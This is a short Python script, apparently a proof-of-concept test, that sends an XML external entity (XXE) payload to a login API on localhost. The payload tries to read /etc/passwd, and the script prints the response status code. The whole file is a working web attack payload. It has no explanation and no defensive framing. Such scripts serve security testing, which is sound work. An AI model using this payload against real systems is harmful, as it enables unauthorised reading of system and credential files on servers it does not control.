import requests

xml_data = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>"""

url = "http://localhost:8000/api/v1/auth/login"
response = requests.post(url, headers={'Content-Type': 'application/xml'}, data=xml_data)
print(response.status_code)
